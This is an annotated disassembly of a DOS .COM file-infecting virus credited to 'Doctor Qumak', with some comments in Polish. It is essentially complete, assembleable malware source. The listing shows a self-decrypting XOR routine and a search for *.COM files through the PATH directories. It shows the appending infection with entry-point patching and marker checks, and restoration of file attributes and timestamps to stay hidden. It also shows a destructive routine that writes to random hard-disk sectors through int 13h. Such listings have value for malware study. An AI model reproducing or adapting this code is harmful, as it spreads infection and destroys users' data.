seg_a	segment	byte public
	assume	cs:seg_a, ds:seg_a

	org	100h

start:	jmp	l_02F3						;0100  E9 01F0
	db	6Bh,73h,0CAh,0Eh	;contamination ptr	;0103  6B 73 CA 0E


	org	2F3h
;----------------------------------------------
l_02F3:	push	cx						;02F3  51
	mov	dx,offset d_0683	;coded virus part addr	;02F4  BA 0683
	nop							;02F7  90

	;<--------- encoding
	push	dx						;02F8  52
	pop	bx						;02F9  5B
	mov	cx,0F9h			;coded block length	;02FA  B9 00F9
	mov	si,dx						;02FD  8B F2
	dec	si						;02FF  4E
	mov	dl,[si]						;0300  8A 14
	inc	si						;0302  46
l_0303:	mov	al,[bx]			;encoding loop		;0303  8A 07
	xor	al,dl						;0305  32 C2
	nop							;0307  90
	mov	[bx],al						;0308  88 07
	inc	bx						;030A  43
	loop	l_0303						;030B  E2 F6
	mov	dx,si						;030D  8B D6

	;<----- restore changed bytes
	xor	ax,ax						;030F  33 C0
	xor	bx,bx						;0311  33 DB
	cld							;0313  FC
	mov	si,dx						;0314  8B F2
	add	si,0ADh		;x_00AD	;saved bytes address	;0316 .81 C6 00AD
	mov	di,100h			;target address		;031A .BF 0100
	mov	cx,7			;changed bytes		;031D  B9 0007
	nop							;0320  90
	rep	movsb						;0321  F3/ A4

	mov	si,dx						;0323  8B F2
	mov	byte ptr ds:[si+0F8h],0	;x_00F8			;0325  C6 84 00F8 00
	mov	ah,30h			;get DOS version nr	;032A  B4 30
	int	21h						;032C  CD 21
	cmp	al,0			;major version		;032E  3C 00
	nop							;0330  90
	jnz	l_0335						;0331  75 02
	nop							;0333  90
	nop							;0334  90
l_0335:	mov	bp,0BFh			;x_00BF			;0335  BD 00BF
	add	bp,si						;0338  03 EE
	mov	byte ptr ds:[bp],0				;033A  3E: C6 46 00 00
	push	es						;033F  06
	nop							;0340  90
	mov	ah,2Fh			;get DTA ptr into es:bx	;0341  B4 2F
	int	21h						;0343  CD 21
	mov	[si],bx			;x_0000			;0345  89 1C
	mov	[si+2],es		;x_0002			;0347  8C 44 02
	pop	es						;034A  07
	mov	dx,5Fh			;x_005F			;034B .BA 005F
	add	dx,si						;034E  03 D6
	mov	ah,1Ah			;set DTA to ds:dx	;0350  B4 1A
	int	21h						;0352  CD 21
	push	es						;0354  06
	push	si						;0355  56
	mov	es,ds:[2Ch]		;environment segment	;0356  8E 06 002C
	mov	di,0						;035A .BF 0000
l_035D:	pop	si						;035D  5E
	push	si						;035E  56
	add	si,1Ah			;x_001A ('PATH=')	;035F  83 C6 1A
	lodsb							;0362  AC
	mov	cx,8000h					;0363  B9 8000
	repne	scasb						;0366  F2/ AE
	mov	cx,4						;0368  B9 0004
l_036B:	lodsb							;036B  AC
	scasb							;036C  AE
	jnz	l_035D						;036D  75 EE
	loop	l_036B						;036F  E2 FA

	;<----- Environment variable 'PATH='
	pop	si						;0371  5E
	pop	es						;0372  07
	mov	[si+16h],di		;x_0016			;0373  89 7C 16
	mov	di,si						;0376  8B FE
	add	di,1Fh			;x_001F = work buffer	;0378  83 C7 1F
	mov	bx,si						;037B  8B DE
	add	si,1Fh			;x_001F = work buffer	;037D  83 C6 1F
	mov	di,si						;0380  8B FE
	jmp	short l_03CE					;0382  EB 4A

	;<----- next directory
l_0384:	cmp	word ptr [si+16h],0	;x_0016 = ptr in env	;0384  83 7C 16 00
	jne	l_0392			;-> not all in 'PATH'	;0388  75 08
	mov	byte ptr ds:[si+0F8h],1	;<- end of 'PATH'	;038A  C6 84 00F8 01
	jmp	l_04E9						;038F  E9 0157

l_0392:	push	ds						;0392  1E
	push	si						;0393  56
	mov	bp,0BFh			;x_00BF			;0394 .BD 00BF
	add	bp,si						;0397  03 EE
	mov	ds,es:[02Ch]		;environment segment	;0399  26: 8E 1E 002C
	mov	di,si						;039E  8B FE
	mov	si,es:[di+16h]		;ptr in environment	;03A0  26: 8B 75 16
	add	di,1Fh			;pattern address	;03A4  83 C7 1F
l_03A7:	lodsb							;03A7  AC
	cmp	al,';'			;directory delimiter	;03A8  3C 3B
	je	l_03BB						;03AA  74 0F
	cmp	al,0						;03AC  3C 00
	je	l_03B8			;position delimiter	;03AE  74 08
	mov	es:[bp],al					;03B0  26: 88 46 00
	inc	bp						;03B4  45
	stosb							;03B5  AA
	jmp	short l_03A7					;03B6  EB EF

l_03B8:	mov	si,0			;end of path ptr	;03B8 .BE 0000
l_03BB:	pop	bx						;03BB  5B
	pop	ds						;03BC  1F
	mov	[bx+16h],si		;save current ptr	;03BD  89 77 16
	cmp	byte ptr [di-1],'\'	;last path char		;03C0  80 7D FF 5C
	je	l_03CE			;-> o.k.		;03C4  74 08
	mov	al,'\'			;<- add dir delimiter	;03C6  B0 5C
	mov	es:[bp],al					;03C8  26: 88 46 00
	inc	bp						;03CC  45
	stosb							;03CD  AA

l_03CE:	mov	byte ptr es:[bp],0	;x_00BF			;03CE  26: C6 46 00 00
	mov	bp,0						;03D3  BD 0000
	mov	[bx+18h],di		;[x_0018]:=x_001F	;03D6  89 7F 18
	mov	si,bx			;offset d_0683		;03D9  8B F3
	add	si,10h			;x_0010	('*.COM')	;03DB  83 C6 10
	mov	cx,6						;03DE  B9 0006
	rep	movsb						;03E1  F3/ A4
	mov	si,bx						;03E3  8B F3
	mov	ah,4Eh		;find 1st filenam match @ds:dx	;03E5  B4 4E
	mov	dx,01Fh			;x_001F	(file pattern)	;03E7 .BA 001F
	add	dx,si						;03EA  03 D6
	mov	cx,3			;attribute pattern	;03EC  B9 0003
	int	21h						;03EF  CD 21
	jmp	short l_0429					;03F1  EB 36

	;<----- next file in the same directory
l_03F3:	mov	bp,0BFh			;file name address	;03F3 .BD 00BF
	add	bp,si						;03F6  03 EE
	push	bp						;03F8  55
	mov	ax,0						;03F9  B8 0000
	dec	bp						;03FC  4D
l_03FD:	inc	bp						;03FD  45
	cmp	byte ptr ds:[bp],'\'	;begin of file name	;03FE  3E: 80 7E 00 5C
	jne	l_0407						;0403  75 02
	mov	ax,bp			;possibly here		;0405  8B C5
l_0407:	cmp	byte ptr ds:[bp],0	;end of filename ?	;0407  3E: 80 7E 00 00
	jne	l_03FD			;-> not now		;040C  75 EF
	cmp	ax,0			;have been any dir ?	;040E  3D 0000
	pop	bp						;0411  5D
	jnz	l_041B			;-> yes			;0412  75 07
	mov	byte ptr ds:[bp],0	;<- we are in the root	;0414  3E: C6 46 00 00
	jmp	short l_0425					;0419  EB 0A

l_041B:	mov	bp,ax			;end of path address	;041B  8B E8
	mov	byte ptr ds:[bp+1],0	;end ptr 		;041D  3E: C6 46 01 00
	mov	bp,0						;0422  BD 0000
l_0425:	mov	ah,4Fh			;find next file match	;0425  B4 4F
	int	21h						;0427  CD 21
				

l_0429:	jnc	l_042E						;0429  73 03
	jmp	l_0384		;-> end of files in current dir	;042B  E9 FF56

l_042E:	mov	bp,0BFh		;x_00BF = victim name		;042E .BD 00BF
	add	bp,si						;0431  03 EE
	dec	bp						;0433  4D
l_0434:	inc	bp						;0434  45
	cmp	byte ptr ds:[bp],0	;find end of path	;0435  3E: 80 7E 00 00
	jne	l_0434						;043A  75 F8
	mov	di,bp						;043C  8B FD
	mov	bp,0						;043E  BD 0000
	push	si						;0441  56
	add	si,7Dh			;x_007D - DTA-file name	;0442  83 C6 7D
l_0445:	lodsb				;add file name		;0445  AC
	stosb							;0446  AA
	cmp	al,0						;0447  3C 00
	jne	l_0445						;0449  75 FA
	pop	si						;044B  5E
	mov	dx,si						;044C  8B D6
	add	dx,0BFh			;x_00BF = file name	;044E .81 C2 00BF
	mov	ax,3D00h		;open file R/O		;0452  B8 3D00
	int	21h						;0455  CD 21
	jnc	l_045C						;0457  73 03
	jmp	l_0384			;-> error, next dir	;0459  E9 FF28

l_045C:	mov	bx,ax			;file handle		;045C  8B D8
	mov	dx,0B8h			;x_00B8	= file buffer	;045E .BA 00B8
	add	dx,si						;0461  03 D6
	mov	cx,7			;bytes to read		;0463  B9 0007
	mov	ah,3Fh			;read handle		;0466  B4 3F
	int	21h						;0468  CD 21
	mov	ah,3Eh			;close handle		;046A  B4 3E
	int	21h						;046C  CD 21
	mov	di,0BBh			;4,5,6,7 bytes from file;046E .BF 00BB
	add	di,si						;0471  03 FE
	mov	bx,0B4h			;contam. ptr pattern	;0473 .BB 00B4
	add	bx,si						;0476  03 DE
	mov	ax,[di]						;0478  8B 05
	cmp	ax,[bx]						;047A  3B 07
	jne	l_0489			;-> not infected yet	;047C  75 0B
	mov	ax,[di+2]					;047E  8B 45 02
	cmp	ax,[bx+2]					;0481  3B 47 02
	jne	l_0489			;-> not infected yet	;0484  75 03
l_0486:	jmp	l_03F3			;-> allready infected	;0486  E9 FF6A

l_0489:	cmp	word ptr [si+79h],0FA00h ;file size		;0489  81 7C 79 FA00
	nop							;048E  90
	ja	l_0486			;-> to big		;048F  77 F5
	cmp	word ptr [si+79h],0Ah	;file size		;0491  83 7C 79 0A
	jb	l_0486			;-> to small		;0495  72 EF
	mov	di,[si+18h]		;678Bh ??		;0497  8B 7C 18
	push	si						;049A  56
	add	si,7Dh			;DTA - file name	;049B  83 C6 7D
l_049E:	lodsb							;049E  AC
	stosb							;049F  AA
	cmp	al,0						;04A0  3C 00
	jne	l_049E						;04A2  75 FA
	pop	si						;04A4  5E
	mov	ax,4300h	;get file attrb, nam@ds:dx	;04A5  B8 4300
	mov	dx,01Fh		;file name			;04A8 .BA 001F
	push	si						;04AB  56
	pop	si						;04AC  5E
	add	dx,si						;04AD  03 D6
	int	21h						;04AF  CD 21
	mov	[si+8],cx	;save oryginal attributes	;04B1  89 4C 08
	mov	ax,4301h	;set file attrb, nam@ds:dx	;04B4  B8 4301
	and	cl,0FEh		;clear R/O			;04B7  80 E1 FE
	mov	dx,01Fh						;04BA .BA 001F
	add	dx,si						;04BD  03 D6
	int	21h						;04BF  CD 21

	mov	ax,3D02h	;open file R/W			;04C1  B8 3D02
	mov	dx,01Fh		;file name address		;04C4 .BA 001F
	add	dx,si						;04C7  03 D6
	int	21h						;04C9  CD 21
	jnc	l_04D0		;-> O.K.			;04CB  73 03
	jmp	l_0638		;-> error			;04CD  E9 0168
l_04D0:	mov	bx,ax		;file handle			;04D0  8B D8
	mov	ax,5700h	;get file date & time		;04D2  B8 5700
	int	21h		; DOS Services  ah=function 57h	;04D5  CD 21
	mov	[si+4],cx					;04D7  89 4C 04
	mov	[si+6],dx					;04DA  89 54 06
	mov	ah,2Ch		;get time			;04DD  B4 2C
	int	21h						;04DF  CD 21
	and	dh,7		;seconds			;04E1  80 E6 07
	jz	l_04E9						;04E4  74 03
	jmp	l_0572		;-> contamine			;04E6  E9 0089

				;<- end of 'PATH' members
l_04E9:	push	bx						;04E9  53
	push	si						;04EA  56
	mov	ah,8		;read parameters for drive dl	;04EB  B4 08
	mov	dl,80h		;HDD 0				;04ED  B2 80
	int	13h						;04EF  CD 13
	cmp	dl,0		;nr of fixed disks		;04F1  80 FA 00
	je	l_0562		;-> no HDD			;04F4  74 6C
	mov	al,cl					;04F6  8A C1
	and	al,3Fh			; '?'		;04F8  24 3F
	mov	ds:[si+0F4h],al				;04FA  88 84 00F4
	mov	al,ch					;04FE  8A C5
	mov	ah,cl					;0500  8A E1
	and	ah,0C0h					;0502  80 E4 C0
	mov	cl,6					;0505  B1 06
	shr	ah,cl					;0507  D2 EC
	mov	ds:[si+0F1h],ax				;0509  89 84 00F1
	mov	ds:[si+0F3h],dh				;050D  88 B4 00F3
l_0511:	mov	ah,2Ch			; ','		;0511  B4 2C
	int	21h		; DOS Services  ah=function 2Ch	;0513  CD 21
				;  get time, cx=hrs/min, dh=sec
	shr	dl,1					;0515  D0 EA
	shr	dl,1					;0517  D0 EA
	and	dl,7					;0519  80 E2 07
	cmp	dl,ds:[si+0F3h]				;051C  3A 94 00F3
	ja	l_0511					;0520  77 EF
	mov	ds:[si+0F7h],dl				;0522  88 94 00F7
	push	ds					;0526  1E
	mov	ax,0					;0527  B8 0000
	mov	ds,ax					;052A  8E D8
	mov	bx,046Ch				;052C .BB 046C
	mov	ax,[bx]					;052F  8B 07
	mov	dx,[bx+2]				;0531  8B 57 02
	pop	ds					;0534  1F
	div	word ptr ds:[si+0F1h]			;0535  F7 B4 00F1
l_0539:	cmp	dx,ds:[si+0F1h]				;0539  3B 94 00F1
	jbe	l_0543					;053D  76 04
	shr	dx,1					;053F  D1 EA
	jmp	short l_0539				;0541  EB F6
l_0543:	mov	ds:[si+0F5h],dx				;0543  89 94 00F5
	mov	ax,dx					;0547  8B C2
	mov	dl,80h					;0549  B2 80
	mov	dh,ds:[si+0F7h]				;054B  8A B4 00F7
	mov	ch,al					;054F  8A E8
	mov	cl,6					;0551  B1 06
	shl	ah,cl					;0553  D2 E4
	mov	cl,ah					;0555  8A CC
	mov	ah,3					;0557  B4 03
	or	cl,1					;0559  80 C9 01
	mov	al,ds:[si+0F4h]				;055C  8A 84 00F4
	int	13h		; Disk  dl=drive 0  ah=func 03h	;0560  CD 13
				;  write sectors from mem es:bx

	;<-----
l_0562:	pop	si						;0562  5E
	pop	bx						;0563  5B
	cmp	byte ptr ds:[si+0F8h],0		;x_00F8		;0564  80 BC 00F8 00
	je	l_056E		;-> O.K.			;0569  74 03
	jmp	l_0647		;-> no 'PATH'			;056B  E9 00D9

l_056E:	jmp	l_0628						;056E  E9 00B7
	nop							;0571  90

	;<----- contamine file
l_0572:	mov	ah,3Fh			; '?'		;0572  B4 3F
	mov	cx,7					;0574  B9 0007
	mov	dx,0ADh					;0577 .BA 00AD
	add	dx,si					;057A  03 D6
	int	21h		; DOS Services  ah=function 3Fh	;057C  CD 21
				;  read file, cx=bytes, to ds:dx
	jnc	l_0583					;057E  73 03
	jmp	l_0628					;0580  E9 00A5
l_0583:	cmp	ax,7					;0583  3D 0007
	je	l_058B					;0586  74 03
	jmp	l_0628					;0588  E9 009D
l_058B:	mov	ax,4202h				;058B  B8 4202
	mov	cx,0					;058E  B9 0000
	mov	dx,0					;0591  BA 0000
	int	21h		; DOS Services  ah=function 42h	;0594  CD 21
				;  move file ptr, cx,dx=offset
	jnc	l_059B					;0596  73 03
	jmp	l_0628					;0598  E9 008D
l_059B:	mov	cx,ax					;059B  8B C8
	sub	ax,3					;059D  2D 0003
	mov	[si+0Eh],ax				;05A0  89 44 0E
	add	cx,490h					;05A3  81 C1 0490
	mov	di,si					;05A7  8B FE
	sub	di,38Eh					;05A9  81 EF 038E
	mov	[di],cx					;05AD  89 0D
	mov	ah,40h			; '@'		;05AF  B4 40
	mov	cx,489h					;05B1  B9 0489
	mov	dx,si					;05B4  8B D6
	sub	dx,390h					;05B6  81 EA 0390
	push	dx					;05BA  52
	push	cx					;05BB  51
	push	bx					;05BC  53
	push	ax					;05BD  50
	mov	ah,2Ch			; ','		;05BE  B4 2C
	int	21h		; DOS Services  ah=function 2Ch	;05C0  CD 21
				;  get time, cx=hrs/min, dh=sec
	mov	dl,cl					;05C2  8A D1
	add	dl,dh					;05C4  02 D6
	add	dl,82h					;05C6  80 C2 82
	mov	[si-1],dl				;05C9  88 54 FF
	mov	bx,si					;05CC  8B DE
	mov	cx,0F9h					;05CE  B9 00F9

l_05D1:	mov	al,[bx]					;05D1  8A 07
	xor	al,dl					;05D3  32 C2
	mov	[bx],al					;05D5  88 07
	inc	bx					;05D7  43
	loop	l_05D1					;05D8  E2 F7

	pop	ax					;05DA  58
	pop	bx					;05DB  5B
	pop	cx					;05DC  59
	pop	dx					;05DD  5A
	int	21h		; DOS Services  ah=function 40h	;05DE  CD 21
				;  write file cx=bytes, to ds:dx
	push	dx					;05E0  52
	push	cx					;05E1  51
	push	bx					;05E2  53
	push	ax					;05E3  50
	mov	bx,si					;05E4  8B DE
	mov	cx,0F9h					;05E6  B9 00F9
	mov	dl,[si-1]				;05E9  8A 54 FF

l_05EC:	mov	al,[bx]					;05EC  8A 07
	xor	al,dl					;05EE  32 C2
	nop						;05F0  90
	mov	[bx],al					;05F1  88 07
	inc	bx					;05F3  43
	loop	l_05EC					;05F4  E2 F6

	pop	ax					;05F6  58
	pop	bx					;05F7  5B
	pop	cx					;05F8  59
	pop	dx					;05F9  5A
	jc	l_0628					;05FA  72 2C
	cmp	ax,489h					;05FC  3D 0489
	jne	l_0628					;05FF  75 27
	mov	ax,4200h				;0601  B8 4200
	nop						;0604  90
	mov	cx,0					;0605  B9 0000
	mov	dx,0					;0608  BA 0000
	int	21h		; DOS Services  ah=function 42h	;060B  CD 21
				;  move file ptr, cx,dx=offset
	jc	l_0628					;060D  72 19
	mov	ah,40h			; '@'		;060F  B4 40
	mov	cx,3					;0611  B9 0003
	mov	dx,si					;0614  8B D6
	add	dx,0Dh					;0616  83 C2 0D
	int	21h		; DOS Services  ah=function 40h	;0619  CD 21
				;  write file cx=bytes, to ds:dx
	mov	cx,4					;061B  B9 0004
	mov	dx,si					;061E  8B D6
	add	dx,0B4h					;0620 .81 C2 00B4
	mov	ah,40h			; '@'		;0624  B4 40
	int	21h		; DOS Services  ah=function 40h	;0626  CD 21
				;  write file cx=bytes, to ds:dx
l_0628:	mov	dx,[si+6]				;0628  8B 54 06
	nop						;062B  90
	mov	cx,[si+4]				;062C  8B 4C 04
	mov	ax,5701h				;062F  B8 5701
	int	21h		; DOS Services  ah=function 57h	;0632  CD 21
				;  get/set file date & time
	mov	ah,3Eh			; '>'		;0634  B4 3E
	int	21h		; DOS Services  ah=function 3Eh	;0636  CD 21
				;  close file, bx=file handle
l_0638:	mov	ax,4301h				;0638  B8 4301
	mov	cx,[si+8]				;063B  8B 4C 08
	mov	dx,01Fh					;063E .BA 001F
	nop						;0641  90
	add	dx,si					;0642  03 D6
	nop						;0644  90
	int	21h		; DOS Services  ah=function 43h	;0645  CD 21
				;  get/set file attrb, nam@ds:dx

	;<----- EXIT
l_0647:	push	ds						;0647  1E
	mov	ah,1Ah			;set DTA to ds:dx	;0648  B4 1A
	mov	dx,[si]			;saved victim DTA	;064A  8B 14
	mov	ds,[si+2]					;064C  8E 5C 02
	int	21h						;064F  CD 21
	pop	ds			;restore registers	;0651  1F
	pop	cx						;0652  59
	xor	ax,ax						;0653  33 C0
	xor	bx,bx						;0655  33 DB
	xor	dx,dx						;0657  33 D2
	xor	si,si						;0659  33 F6
	nop							;065B  90
	mov	di,100h			;Victim entry point	;065C .BF 0100
	nop							;065F  90
	push	di						;0660  57
	nop							;0661  90
	xor	di,di						;0662  33 FF
	retn				;-> run victim		;0664  C3

	db	1,2,3					;0665  01 02 03
	db	1,2,3					;0668  01 02 03
	db	4,5,6					;066B  04 05 06

	db	0Dh,0Ah					;066E  0D 0A
	db	'(C) DOCTOR QUMAK'			;0670  28 43 29 20 44 4F 43 54
							;0678  4F 52 20 51 55 4D 41 4B
	db	0Dh,0Ah					;0680  0D 0A

	db	0B6h		;klucz kodowania	;0682  B6

d_0683	label	byte

x_0000	dw	0080h		;victim DTA offset		;0000  80 00
x_0002	dw	10ABh		;victim DTA segment		;0003  AB 10
x_0004	dw	9BEFh		;victim time stamp		;0004  EF 9B
x_0006	dw	1587h		;victim date stamp		;0006  87 15
x_0008	dw	0020h		;victim attribute		;0008  20 00

	db	0E9h,0F9h,00h					;000A  E9 F9 00
	db	0E9h,0F0h,01h					;000D  E9 F0 01

x_0010	db	'*.COM',0				;0010  2A 2E 43 4F 4D 00
x_0016	dw	002Ah		;ptr in environment		;0016  2A 00

x_0018	dw	678Bh		;???			;0018  8B 67

x_001A	db	'PATH='					;001A  50 41 54 48 3D
x_001F	db	'CS.COM',0				;001F  43 53 2E 43 4F 4D 00
	db	'.COM', 0				;0026  2E 43 4F 4D 00
	db	'T.COM', 0				;002B  54 2E 43 4F 4D 00
	db	'OM',0					;0031  4F 4D 00
	db	43 dup (' ')				;0034  002B[20]

	;<----- virus DTA
x_005F	db	04h						;005F  04
	db	'????????COM'					;0060  0008[3F] 43 4F 4D
	db	03h,14h,00h,51h,01h,00h,00h,00h,00h		;006B  03 14 00 51 01 00 00 00 00
x_0074	db	20h			;attribute found	;0074  20
x_0075	dw	9BEFh			;time stamp		;0075  EF 9B
x_0077	dw	1587h			;date stamp		;0077  87 15
x_0079	dw	01F3h,0			;file size		;0079  F3 01 00 00
x_007D	db	'CS.COM',0,' COM',0,0	;file name		;007D  43 53 2E 43 4F 4D 00 20 43 4F 4D 00 00

	db	0EAh,0F0h				;008A  EA F0
	db	0FFh, 00h,0F0h				;008C  FF 00 F0
	db	'Hello world from my virus !',0Dh,0Ah,'$'	;008F  48 65 6C 6C 6F 20
							;0095  77 6F 72 6C 64 20
							;009B  66 72 6F 6D 20 6D
							;00A1  79 20 76 69 72 75
							;00A7  73 20 21 0D 0A 24
	;<----- Saved victim bytes
x_00AD	db	0EBh,00h,1Eh,0B8h,00h,00h,50h			;00AD  EB 00 1E B8 00 00 50

	;contamination pattern
x_00B4	db	6Bh,73h,0CAh,0Eh				;00B4  6B 73 CA 0E

	;<----- file buffer
x_00B8	db	0EBh,00h,1Eh					;00B8  EB 00 1E
x_00BB	db	0B8h,00h,00h,50h	;contam.ptr.here	;00BB  B8 00 00 50

x_00BF	db	'CS.COM',0		;file name & path	;00BF  43 53 2E 43 4F 4D 00
	db	'.COM',0					;00C6  2E 43 4F 4D 00
	db	'T.COM', 0					;00CB  54 2E 43 4F 4D 00
	db	'M',0						;00D1  4D 00
	db	' the stuff that should be here'		;00D3  20 74 68 65 20 73
								;00D9  74 75 66 66 20 74
								;00DF  68 61 74 20 73 68
								;00E5  6F 75 6C 64 20 62
								;00EB  65 20 68 65 72 65
x_00F1	dw	0					;00F1  00 00
x_00F3	db	0					;00F3  00
x_00F4	db	0					;00F4  00
x_00F5	dw	0					;00F5  00 00
x_00F7	db	0					;00F7  00
x_00F8	db	0			;1=no path		;00F8  00
seg_a	ends

	end	start
